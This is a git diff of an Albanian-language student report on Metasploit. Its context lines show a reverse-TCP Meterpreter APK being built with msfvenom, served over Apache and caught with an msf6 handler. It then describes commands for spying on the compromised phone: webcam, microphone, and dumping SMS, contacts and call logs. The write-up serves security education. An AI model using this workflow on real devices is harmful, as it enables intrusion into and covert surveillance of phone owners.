@@ -3,10 +3,7 @@ title: Analiza e veglës Metasploit
 ---
 
 # Analiza e veglës Metasploit
-<!-- 
-| [Fatbardh Kadriu](https://github.com/FatbardhKadriu) | [Arbena Musa](https://github.com/ArbenaMusa) | [Albana Hysenaj](https://github.com/albanah) |
-| ---------------------------------------------------- | -------------------------------------------- | -------------------------------------------- |
-|                                                      |                                              |                                              | -->
+
 
 <table width="100%">
 <tr>
@@ -23,6 +20,49 @@ title: Analiza e veglës Metasploit
 </table>
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ky punim është kryer në kuadër të detyrës së dytë në lëndën "Siguria e Informacionit" dhe shembujt e testuar janë përdorur vetëm për qëllime edukative. Zhvillimi i shembujve të tillë pa dijeninë dhe miratimin e personave të përfshirë si target konsiderohet jolegale.
+
+#### Përmbajtja
+
+* [Teknologjitë dhe pajisjet e përdorura](#teknologjitë-dhe-pajisjet-e-përdorura)
+* [Çfarë është Metasploit](#çfarë-është-metasploit)
+* [Shembujt e testuar](#shembujt-e-testuar)
+    + [Exploit](#exploit)
+    + [Payload](#payload)
+    + [Krijimi i android aplikacionit të infektuar](#krijimi-i-android-aplikacionit-të-infektuar)
+    + [Kalimi i aplikacionit të infektuar tek sistemi i targetuar](#kalimi-i-aplikacionit-të-infektuar-tek-sistemi-i-targetuar)
+    + [Shfrytëzimi i sistemit të targetuar](#shfrytëzimi-i-sistemit-të-targetuar)
+* [Komandat e Meterpreter](#komandat-e-meterpreter)
+    + [Komandat kryesore](#komandat-kryesore)
+      - [background dhe bg](#background-dhe-bg)
+    + [Komandat e sistemit të fajllave](#komandat-e-sistemit-të-fajllave)
+      - [cd dhe lcd](#cd-dhe-lcd)
+      - [ls dhe lls](#ls-dhe-lls)
+      - [pwd dhe lpwd](#pwd-dhe-lpwd)
+      - [search](#search)
+    + [Komandat e rrjetit](#komandat-e-rrjetit)
+      - [ifconfig dhe ipconfig](#ifconfig-dhe-ipconfig)
+    + [Komandat e sistemit](#komandat-e-sistemit)
+      - [getuid](#getuid)
+      - [localtime](#localtime)
+      - [shell](#shell)
+      - [sysinfo](#sysinfo)
+    + [Komandat e kamerës](#komandat-e-kamerës)
+      - [record_mic](#record-mic)
+      - [webcam_list](#webcam-list)
+      - [webcam_snap](#webcam-snap)
+      - [webcam_stream](#webcam-stream)
+    + [Komandat e androidit](#komandat-e-androidit)
+      - [check_root](#check-root)
+      - [dump_calllog](#dump-calllog)
+      - [dump_contacts](#dump-contacts)
+      - [dump_sms](#dump-sms)
+      - [send_sms](#send-sms)
+      - [set_audio_mode](#set-audio-mode)
+    + [Komandat për kontrollimin e aplikacioneve](#komandat-për-kontrollimin-e-aplikacioneve)
+      - [app_list](#app-list)
+      - [app_run](#app-run)
+      - [app_unisntall](#app-unisntall)
+
 
 ## Teknologjitë dhe pajisjet e përdorura
 
@@ -88,11 +128,8 @@ Matching Modules
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload `android/meterpreter/reverse_tcp` përdoret për sistemin android. Meterpreter është shkurtesë për meta interpreter që është një payload i cili mundëson vendosjen e komunikimit mes sulmuesit dhe targetit si dhe shkëmbimin e të dhënave prej sistemit të kompromentuar tek sulmuesi përmes komandave që jepen nga sulmuesi në njërën anë të soketit. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin sistemi i targetuar, komunikon përsëri mbrapsht me sistemin sulmues. Sistemi sulmues cakton një port për dëgjim në të cilin pret lidhjen me targetin dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.
 
-<!-- ![Reverse Shell](READMEresources/reverse_shell.png "Ilustrimi se si funksionon reverse shell")
-_Fig. 1: Ilustrimi se si funksionon reverse shell_ -->
-
 <center>
-<img src="READMEresources/reverse_shell.png">
+<img src="resources/reverse_shell.png">
 <figcaption><small><i>Fig. 1: Ilustrimi se si funksionon reverse shell</i></small></figcaption>
 </center>
 
@@ -114,11 +151,8 @@ $ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > 
 | R                          | Raw format (format i papërpunuar).                                     |
 | /root/Desktop/OurApp.apk | Lokacioni ku ruhet APK aplikacioni i krijuar.                          |
 
-<!-- ![Krijimi i apk fajllit](READMEresources/krijimi_i_apk_fajllit.gif "Krijimi i apk fajllit")
-_Gif. 1: Krijimi i apk fajllit_ -->
-
 <center>
-<img width="100%" src="READMEresources/krijimi_i_apk_fajllit.gif"/>
+<img width="100%" src="resources/krijimi_i_apk_fajllit.gif"/>
 <figcaption><small><i>Video 1: Krijimi i apk fajllit</i></small></figcaption>
 </center>
 
@@ -132,15 +166,10 @@ $ service apache2 start
 $ service apache2 status
 ```
 
-<!-- | ![Kalimi i aplikacionit1](READMEresources/kalimi_i_aplikacionit1.gif "Shkarkimi i aplikacionit") | ![Kalimi i aplikacionit1](READMEresources/kalimi_i_aplikacionit2.gif "Hapja e aplikacionit pas shkarkimit") |
-| ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------- |
-| _Gif. 2: Shkarkimi i aplikacionit_                                                               | _Gif. 3: Hapja e aplikacionit pas shkarkimit_                                                               | -->
-
-
 <table width="100%" border="0">
 <tr>
-<td width="50%"><img width="96%" src="READMEresources/kalimi_i_aplikacionit1.gif"/></td>
-<td width="50%"><img width="96%" src="READMEresources/kalimi_i_aplikacionit2.gif"/></td>
+<td width="50%"><img width="96%" src="resources/kalimi_i_aplikacionit1.gif"/></td>
+<td width="50%"><img width="96%" src="resources/kalimi_i_aplikacionit2.gif"/></td>
 </tr>
 <tr>
 <td><figcaption><small><i><center>Video 2: Shkarkimi i aplikacionit</center></i></small></figcaption></td>
@@ -164,11 +193,8 @@ msf6 > set LPORT 4444
 msf6 > exploit
 ```
 
-<!-- ![Komandat e exploit](READMEresources/exploit.gif "Përdorimi i modelit exploit")s
-_Gif. 4: Përdorimi i modulit exploit_ -->
-
 <center>
-<img width="100%" src="READMEresources/exploit.gif"/>
+<img width="100%" src="resources/exploit.gif"/>
 <figcaption><small><i>Video 4: Përdorimi i modulit <b>exploit</b></i></small></figcaption>
 </center>
 
@@ -195,11 +221,8 @@ Core Commands
 - `sessions` - shfaq listën e të gjithë sesioneve aktivë,
 - `sessions -i <numri i session>` - e merr nga prapavija sesionin e caktuar në bazë të numrit të specifikuar dhe kalon në meterpreter shell për atë sesion.
 
-<!-- ![Komandat kryesore](READMEresources/komandat_kryesore.gif "Përdorimi i komandës background")
-_Gif. 5: Përdorimi i komandës `background`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_kryesore.gif"/>
+<img width="100%" src="resources/komandat_kryesore.gif"/>
 <figcaption><small><i>Video 5: Përdorimi i komandës <b>background</b></i></small></figcaption>
 </center>
 
@@ -232,11 +255,9 @@ Stdapi: File system Commands
 
 `pwd` (print working directory) tregon shtegun aktual në sistemin e kompromentuar, ndërsa lpwd tregon shtegun aktual në sistemin e sulmuesit.
 
-<!-- ![Komandat e fajll sistemit](READMEresources/komandat_e_fajll_sistemit.gif "Përdorimi i komandave cd, lcd, ls, lls, pwd dhe lpwd")
-_Gif. 6: Përdorimi i komandave `cd`, `lcd`, `ls`, `lls`, `pwd` dhe `lpwd`_ -->
 
 <center>
-<img width="100%" src="READMEresources/komandat_e_fajll_sistemit.gif"/>
+<img width="100%" src="resources/komandat_e_fajll_sistemit.gif"/>
 <figcaption><small><i>Video 6: Përdorimi i komandave <b>cd</b>, <b>lcd</b>, <b>ls</b>, <b>lls</b>, <b>pwd</b> dhe <b>lpwd</b></i></small></figcaption>
 </center>
 
@@ -250,11 +271,8 @@ _Gif. 6: Përdorimi i komandave `cd`, `lcd`, `ls`, `lls`, `pwd` dhe `lpwd`_ -->
 
 Meqë kërkimi i fajllave në tërë hapsirën memorike të sistemit të kompromentuar është i kushtueshëm në kohë dhe përdoruesi i saj mund ta vërejë mbingarkesën, sygjerohet që kur kërkohet të specifikohet një pjesë e caktuar e memories për të reduktuar kohën e kërkimit.
 
-<!-- ![Komandat e fajll sistemit](READMEresources/komandat_e_fajll_sistemit2.gif "Përdorimi i komandës search")
-_Gif. 7: Përdorimi i komandës `search`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_e_fajll_sistemit2.gif"/>
+<img width="100%" src="resources/komandat_e_fajll_sistemit2.gif"/>
 <figcaption><small><i>Video 7: Përdorimi i komandës <b>search</b></i></small></figcaption>
 </center>
 
@@ -274,11 +292,8 @@ Stdapi: Networking Commands
 
 `ifconfig` dhe `ipconfig` shfaqin ndërfaqen e rrjetit në të cilin është e kyçur sistemi sulmues dhe sistemi i kompromentuar.
 
-<!-- ![Komandat e rrjetit](READMEresources/komandat_e_rrjetit.gif "Përdorimi i komandave ifconfig dhe ipconfig")
-_Gif. 8: Përdorimi i komandave `ifconfig` dhe `ipconfig`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_e_rrjetit.gif"/>
+<img width="100%" src="resources/komandat_e_rrjetit.gif"/>
 <figcaption><small><i>Video 8: Përdorimi i komandave <b>ifconfig</b> dhe <b>ipconfig</b></i></small></figcaption>
 </center>
 
@@ -312,11 +327,8 @@ Stdapi: System Commands
 
 `sysinfo` shfaq të dhënat e sistemit duke përfshirë pikën e dëgjimit tek sulmuesi, sistemin operativ të sistemit të kompromentuar dhe llojin e meterpreter.
 
-<!-- ![Komandat e sistemit](READMEresources/komandat_e_sistemit.gif "Përdorimi i komandave getuid, localtime, shell dhe sysinfo")
-_Gif. 9: Përdorimi i komandave `getuid`, `localtime`, `shell` dhe `sysinfo`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_e_sistemit.gif"/>
+<img width="100%" src="resources/komandat_e_sistemit.gif"/>
 <figcaption><small><i>Video 9: Përdorimi i komandave <b>getuid</b>, <b>localtime</b>, <b>shell</b> dhe <b>sysinfo</b></i></small></figcaption>
 </center>
 
@@ -342,11 +354,8 @@ Stdapi: Webcam Commands
 - `-f` lokacioni ku ruhet audio fajlli,
 - `-p` luan automatikisht audio fajllin e inçizuar (si e parazgjedhur është true).
 
-<!-- ![Komanda record_mic](READMEresources/komanda_record_mic.gif "Përdorimi i komandës record_mic")
-_Gif. 10: Përdorimi i komandës `record_mic`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komanda_record_mic.gif"/>
+<img width="100%" src="resources/komanda_record_mic.gif"/>
 <figcaption><small><i>Video 10: Përdorimi i komandës <b>record_mic</b></i></small></figcaption>
 </center>
 
@@ -360,19 +369,14 @@ _Gif. 10: Përdorimi i komandës `record_mic`_ -->
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
 
-<!-- ![Komanda webcam](READMEresources/komanda_webcam.gif "Përdorimi i komandave webcam_list dhe webcam_snap duke specifikuar kamerën e pasme")
-_Gif. 11: Përdorimi i komandave `webcam_list` dhe `webcam_snap` duke specifikuar kamerën e pasme_ -->
-
 <center>
-<img width="100%" src="READMEresources/komanda_webcam.gif"/>
+<img width="100%" src="resources/komanda_webcam.gif"/>
 <figcaption><small><i>Video 11: Përdorimi i komandave <b>webcam_list</b> dhe <b>webcam_snap</b> duke specifikuar kamerën e pasme</i></small></figcaption>
 </center>
 <br/>
-<!-- ![Komanda webcam](READMEresources/komanda_webcam2.gif "Përdorimi i komandës webcam_snap duke specifikuar kamerën e përparme")
-_Gif. 12: Përdorimi i komandës `webcam_snap` duke specifikuar kamerën e përparme_ -->
 
 <center>
-<img width="100%" src="READMEresources/komanda_webcam2.gif"/>
+<img width="100%" src="resources/komanda_webcam2.gif"/>
 <figcaption><small><i>Video 12: Përdorimi i komandës <b>webcam_snap</b> duke specifikuar kamerën e përparme</i></small></figcaption>
 </center>
 
@@ -382,19 +386,14 @@ _Gif. 12: Përdorimi i komandës `webcam_snap` duke specifikuar kamerën e përp
 
 - `-i` specifikon numrin identifikues të kamerës e cila përdoret.
 
-<!-- ![Komanda webcam_stream](READMEresources/komanda_webcam_stream.gif "Përdorimi i komandës webcam_stream duke specifikuar kamerën e pasme")
-_Gif. 13: Përdorimi i komandës `webcam_stream` duke specifikuar kamerën e pasme_ -->
-
 <center>
-<img width="100%" src="READMEresources/komanda_webcam_stream.gif"/>
+<img width="100%" src="resources/komanda_webcam_stream.gif"/>
 <figcaption><small><i>Video 13: Përdorimi i komandës <b>webcam_stream</b> duke specifikuar kamerën e pasme</i></small></figcaption>
 </center>
 <br/>
-<!-- ![Komanda webcam_stream](READMEresources/komanda_webcam_stream2.gif "Përdorimi i komandës webcam_stream duke specifikuar kamerën e përparme")
-_Gif. 14: Përdorimi i komandës `webcam_stream` duke specifikuar kamerën e përparme_ -->
 
 <center>
-<img width="100%" src="READMEresources/komanda_webcam_stream2.gif"/>
+<img width="100%" src="resources/komanda_webcam_stream2.gif"/>
 <figcaption><small><i>Video 14: Përdorimi i komandës <b>webcam_stream</b> duke specifikuar kamerën e përparme</i></small></figcaption>
 </center>
 
@@ -422,11 +421,8 @@ Android Commands
 
 `dump_calllog` nxjerr listën e të gjitha telefonatave të zhvilluara nga sistemi i kompromentuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilës thirrje.
 
-<!-- ![Komandat e apndroidit](READMEresources/komandat_e_androidit.gif "Përdorimi i komandave check_root dhe dump_calllog")
-_Gif. 15: Përdorimi i komandave `check_root` dhe `dump_calllog`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_e_androidit.gif"/>
+<img width="100%" src="resources/komandat_e_androidit.gif"/>
 <figcaption><small><i>Video 15: Përdorimi i komandave <b>check_root</b> dhe <b>dump_calllog</b></i></small></figcaption>
 </center>
 
@@ -438,11 +434,8 @@ _Gif. 15: Përdorimi i komandave `check_root` dhe `dump_calllog`_ -->
 
 `dump_sms` nxjerr listë e sms-ëve të shkëmbyer nga sistemi i kompromentuar dhe e ruan atë në një tekst fajll duke specifikuar detajet e secilit sms.
 
-<!-- ![Komandat e android2](READMEresources/komandat_e_android2.gif "Përdorimi i komandave dump_contacts dhe dump_sms")
-_Gif. 16: Përdorimi i komandave `dump_contacts` dhe `dump_sms`_ -->
-
 <center>
-<img width="100%" src="READMEresources/komandat_e_android2.gif"/>
+<img width="100%" src="resources/komandat_e_android2.gif"/>
 <figcaption><small><i>Video 16: Përdorimi i komandave <b>dump_contacts</b> dhe <b>dump_sms</b></i></small></figcaption>
 </center>
 
@@ -453,20 +446,16 @@ _Gif. 16: Përdorimi i komandave `dump_contacts` dhe `dump_sms`_ -->
 - `-d` specifikon numrin telefonik tek i cili do të dërgohet mesazhi,
 - `-t` specifikon përmbajtjen tekstuale të mesazhit që do të dërgohet.
 
-<!-- | ![Komandat e mesazhit](READMEresources/mesazhi.gif "Përdorimi i komandës send_sms") | ![Komandat e mesazhit](READMEresources/mesazhi2.gif "Vëzhgimi i dërgimit të mesazhit në android") |
-| ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
-| _Gif. 17: Përdorimi i komandës `send_sms`_                                          | _Gif. 18: Vëzhgimi i dërgimit të mesazhit në android_                                             | -->
-
 <table width="100%">
 <tr>
 <td width="75%">
 <center>
-<img width="100%" src="READMEresources/mesazhi.gif"/>
+<img width="100%" src="resources/mesazhi.gif"/>
 </center>
 </td>
 <td width="25%">
 <center>
-<img width="100%" src="READMEresources/mesazhi2.gif"/>
+<img width="100%" src="resources/mesazhi2.gif"/>
 </center>
 </td>
 </tr>
@@ -486,20 +475,16 @@ _Gif. 16: Përdorimi i komandave `dump_contacts` dhe `dump_sms`_ -->
   - 1 - normal,
   - 2 - high (me zë të lartë).
 
-<!-- | ![Komandat e audio](READMEresources/audio.gif "Përdorimi i komandës set_audio_mode") | ![Komandat e audio2](READMEresources/audio2.gif "Vëzhgimi i ndërrimit të audio modit në android") |
-| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------- |
-| _Gif. 19: Përdorimi i komandës `set_audio_mode`_                                     | _Gif. 20: Vëzhgimi i ndërrimit të audio modit në android_                                         | -->
-
 <table width="100%">
 <tr>
 <td width="75%">
 <center>
-<img width="100%" src="READMEresources/audio.gif"/>
+<img width="100%" src="resources/audio.gif"/>
 </center>
 </td>
 <td width="25%">
 <center>
-<img width="100%" src="READMEresources/audio2.gif"/>
+<img width="100%" src="resources/audio2.gif"/>
 </center>
 </td>
 </tr>
@@ -530,20 +515,16 @@ Application Controller Commands
 
 `app_run` hap një aplikacion të caktuar që është i instaluar tek sistemi i kompromentuar varësisht se cilin e zgjedhim.
 
-<!-- | ![Komandat e aplikacioneve](READMEresources/komandat_e_aplikacioneve.gif "Përdorimi i komandës app_run") | ![Komandat e aplikacioneve1](READMEresources/komandat_e_aplikacioneve1.gif "Vëzhgimi i hapjes së aplikacionit në android") |
-| -------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
-| _Gif. 21: Përdorimi i komandës `app_run`_                                                                | _Gif. 22: Vëzhgimi i hapjes së aplikacionit në android_                                                                    | -->
-
 <table width="100%">
 <tr>
 <td width="75%">
 <center>
-<img width="100%" src="READMEresources/komandat_e_aplikacioneve.gif"/>
+<img width="100%" src="resources/komandat_e_aplikacioneve.gif"/>
 </center>
 </td>
 <td width="25%">
 <center>
-<img width="100%" src="READMEresources/komandat_e_aplikacioneve1.gif"/>
+<img width="100%" src="resources/komandat_e_aplikacioneve1.gif"/>
 </center>
 </td>
 </tr>
@@ -557,20 +538,17 @@ Application Controller Commands
 
 `app_uninstall` shfaq dialogun për të fshirë një aplikacion të sistemit.
 
-<!-- | ![Komandat e aplikacioneve2](READMEresources/komandat_e_aplikacioneve2.gif "Përdorimi i komandës app_uninstall") | ![Komandat e aplikacioneve3](READMEresources/komandat_e_aplikacioneve3.gif "Vëzhgimi i shfaqjes së kërkesës për fshirjen e aplikacionit në android") |
-| ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
-| _Gif. 23: Përdorimi i komandës `app_uninstall`_                                                                  | _Gif. 24: Vëzhgimi i shfaqjes së kërkesës për fshirjen e aplikacionit në android_                                                                    | -->
 
 <table width="100%">
 <tr>
 <td width="75%">
 <center>
-<img width="100%" src="READMEresources/komandat_e_aplikacioneve2.gif"/>
+<img width="100%" src="resources/komandat_e_aplikacioneve2.gif"/>
 </center>
 </td>
 <td width="25%">
 <center>
-<img width="100%" src="READMEresources/komandat_e_aplikacioneve3.gif"/>
+<img width="100%" src="resources/komandat_e_aplikacioneve3.gif"/>
 </center>
 </td>
 </tr>
